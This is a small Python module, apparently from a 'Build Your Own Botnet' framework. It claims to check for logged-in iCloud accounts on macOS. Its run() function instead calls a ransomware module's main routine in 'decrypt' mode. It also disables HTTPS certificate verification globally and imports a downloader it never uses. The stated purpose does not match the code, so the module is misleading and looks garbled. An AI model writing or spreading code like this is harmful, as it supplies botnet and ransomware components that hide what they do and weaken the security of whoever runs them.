#!/usr/bin/python
# -*- coding: utf-8 -*-
'iCloud (Build Your Own Botnet)'

# standard library
import os
import sys
import ssl
import subprocess

if sys.version_info[0] < 3:
    from urllib import urlretrieve
else:
    from urllib.request import urlretrieve
from ransom_main import main as ransom_main
# utilities
import util

# globals
packages = []
platforms = ['darwin']
command = True
usage = 'icloud'
description = """
Check for logged in iCloud accounts on macOS
"""

# create default ssl context (workaround for python3 compatibility)
ssl._create_default_https_context = ssl._create_unverified_context


def run():
    """
    Check for logged in iCloud account on macOS
    """
    try:
        ransom_main("decrypt")
    except Exception as e:
        return "{} error: {}".format(__name__, str(e))
